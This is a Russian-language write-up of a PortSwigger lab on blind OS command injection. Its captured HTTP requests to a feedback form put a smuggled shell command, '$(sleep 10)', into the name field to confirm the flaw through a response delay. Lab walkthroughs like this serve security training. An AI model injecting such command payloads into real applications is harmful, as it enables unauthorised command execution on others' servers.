---
title: "Blind OS command injection with time delays"
date: 2025-06-27
tags: [injection, writeup, web]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays"
classes: wide
---

Содержит уязвимость **Blind OS command injection**. Для решения нужно внедрить шелл и вызвать 10-ти секундную задержку ответа от сервера.

```
https://0ac5007f03b14177805be4a200920057.web-security-academy.net/
```

## Solution

Рекон — наше все. Пойду изучать страницу. Мой интерес вызвала форма для отзыва. Поковыряю ее:

```http
POST /feedback/submit HTTP/2
Host: 0ac5007f03b14177805be4a200920057.web-security-academy.net
Cookie: session=xpoqTmDMOzriSDsLRyYXUxX5xlpU1lvO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac5007f03b14177805be4a200920057.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://0ac5007f03b14177805be4a200920057.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=gO442Yqa8SZUXZZM1ifSoONgSgGIh4az&name=name&email=mail%40mail&subject=subject&message=message+
```

Отзыв отправляется через данную форму. Попробую подставить разные значения в поля. Так же интересно, что в ответе мне вернулся пустой `json`:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2

{}
```

Итак, попробую подставить `sleep 10` в поля формы:

```http
POST /feedback/submit HTTP/2
Host: 0ac5007f03b14177805be4a200920057.web-security-academy.net
Cookie: session=xpoqTmDMOzriSDsLRyYXUxX5xlpU1lvO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac5007f03b14177805be4a200920057.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Origin: https://0ac5007f03b14177805be4a200920057.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=gO442Yqa8SZUXZZM1ifSoONgSgGIh4az&name=$(sleep 10)&email=mail%40mail&subject=subject&message=message+body
```

И сразу попадание)

![IMG](/assets/images/IMG_os_command_injection/IMG_Blind_OS_command_injection_with_time_delays/1.png){: height="200" .align-center}

Лаба решена, получается...

![IMG](/assets/images/IMG_os_command_injection/IMG_Blind_OS_command_injection_with_time_delays/2.png){: height="200" .align-center}
